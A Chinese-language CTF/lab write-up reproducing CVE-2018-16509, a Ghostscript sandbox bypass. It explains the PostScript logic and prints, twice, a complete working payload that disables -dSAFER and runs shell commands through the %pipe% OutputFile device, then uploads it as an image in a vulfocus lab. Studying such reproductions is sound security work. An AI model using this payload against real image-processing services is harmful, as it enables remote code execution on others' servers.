---
title: 'cve_2018_16509漏洞复现之沙盒绕过（ghostscript）'
abbrlink: a8ca2920
categories: 
  - ctf题解/web
date: 2026-05-14 22:24:15
---# cve_2018_16509漏洞复现之沙盒绕过（ghostscript）



```
 名称: vulfocus/ghostscript-cve_2018_16509:latest

 描述: 

GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。

在 9.24 之前的 Artifex Ghostscript 中发现了一个问题。能够提供精心制作的 PostScript 以使用“管道”指令执行代码的攻击者可能会在处理 /invalidaccess 异常期间使用不正确的“特权恢复”检查


```



## 0x00 漏洞基本信息

**CVE 编号**：CVE-2018-16509

**漏洞类型**：沙盒绕过 / 远程代码执行 (RCE)

**受影响组件**：Ghostscript 9.24 之前的所有版本

**成因**：利用 `restores` 操作中的内存不一致性，通过制造一个**伪造的异常状态**，使内核在自同步过程中，将 `LockSafetyParams` 从 `1` 误写为 `0`。

Ghostscript 的安全模式（`-dSAFER`）依赖于内存中的一个布尔值：**`LockSafetyParams`**。

- 当其为 `1` 时，系统禁止修改敏感设备属性（如输出路径 `OutputFile`）。
- 当其为 `0` 时，系统允许执行包括 `%pipe%`（管道重定向）在内的高权限指令。

---



## 0x01 必备知识点：

### 一、 PostScript 语法特性：逆波兰表示法 (RPN)

PostScript 是基于**堆栈（Stack）**的语言。它的核心逻辑是：**操作对象在前，操作符在后**。

1. **堆栈操作 (Stack-based)**
   - 当你看到 `save` 或 `legal` 时，解释器会把它们压入堆栈。
   - 当你看到 `undef` 或 `restore` 时，解释器会从堆栈顶部取出数据并执行。
2. **可执行数组 (Procedure)**
   - **语法**：`{ ... }`
   - **特性**：大括号内的内容不会立即执行，而是作为一个整体（过程）压入堆栈。
3. **控制流 (Control Flow)**
   - **语法**：`stopped`
   - **特性**：它执行前面的过程。如果过程报错，它会在堆栈压入 `true`，否则压入 `false`。
   - **语法**：`if`
   - **特性**：从堆栈取出一个布尔值，如果是 `true` 则执行前面的代码块。
4. **名称与字典 (Name & Dictionary)**
   - **语法**：`/name`
   - **特性**：带斜杠的是“名称”（相当于变量名），不带斜杠的是执行该名称对应的命令



### 二、沙盒

- （看了维基，有一段话挺有意思的“在沙盒页编辑的内容就像在沙滩上所写的文字，涨潮时就会消失。同样**沙盒**中所写的内容，不久也会消去。”）

  意思就是修改沙盒只停留在一个虚拟层，没有写入硬件，一旦程序关闭，一切修改都没了

- 结合本此漏洞，在Ghostscript中沙河开启只能处理数学运算和绘图指令。不能执行系统命令 `%pipe%ls`”

![image-20260409113630461](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260409113630662.png)



---

## 0x02 前期准备：

### 准备代码

payload：

 **PostScript (PS)**

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls / > /tmp/success && cat /tmp/success) currentdevice putdeviceprops
```

#### 1.怎么绕过沙箱？—— 在处理异常的时候趁机拿到高权限并”保存“，最后执行代码

### 具体分析：

一开始我们的沙盒状态`LockSafetyParams = true`，

save是保存当前所有状态。

--

legal是调用预定义的页面尺寸设置

legal会调用到setpagedevice（调用的顺序是 字典栈中从上到下 ，最上面的是userdict，最下面才是systemdict）。

但是后面  "{ legal } stopped { pop } if"  ,此时legal需要用的是系统字典中的setpagedevice，并不是userdict里面的。

[因为原生的、拥有底层操作权限的 `setpagedevice` 在执行时才会用底层的 C 函数 `gs_setpagedevice`，而此函数在legal处理设备重置时，如果发现当前的`null restore` 异常，它会尝试自动同步设备状态，那么我们就在硬件中储存了处理异常需要用到的高权限了]

所以一开始我们可以undef删除掉用户字典中的setpagedevice，他就只能拿到systemdic里面的setpagedevice了。

--

由于null不能被restore，所以stopped往堆栈里面扔了一个true，if拿到堆栈中的true执行pop清除掉推展顶部报错信息，让程序继续进行（此时权限上升了）

此时再legal一下强制调用设备页面重置，由于刚刚pop后仍处于异常状态模式（还没有处理完错误，刚刚pop只是掩盖了报错信息），也就是还是高权限状态，而legal触发的setpagedevice会去修改页面参数（legal只修改页面大小，其他都照搬以前的配置），由于刚刚处理异常时沙盒状态就是关着的，legal后拿到的状态还是关着的沙盒状态。

`{ ... } stopped { pop } if`掩盖其他报错，再次保证程序继续运行

--

restore看似是恢复原样，实际上只能恢复 PostScript 层面的变量和堆栈，之前沙盒关闭的配置没有被恢复却被”保存“起来了。

--

#### 2. 然后进行命令输出：

```
mark /OutputFile (%pipe%命令) currentdevice putdeviceprops
```

- **`mark`**: 在堆栈中放置一个标记点。
- **`/OutputFile`**: 定义一个键（Key）
- **`(%pipe%...)`**:pipe文件前缀，会把后面的内容当成命令交给系统输出
- **`currentdevice`**: 将当前设备对象压入堆栈。
- **`putdeviceprops`**: 消费掉堆栈中从 `mark` 开始的所有数据，将其作为属性应用到设备上。



payload：

 **PostScript (PS)**

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%ls / > /tmp/success && cat /tmp/success) currentdevice putdeviceprops

```





## 0x03 复现过程

#### 1.构造带有代码的图片 上传即可

![image-20260409103608686](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260409103609049.png)

#### 2.改变命令，查看flag

![image-20260409103914197](https://cdn.jsdelivr.net/gh/2829750658t-svg/Screenshots@main/img/20260409103914558.png)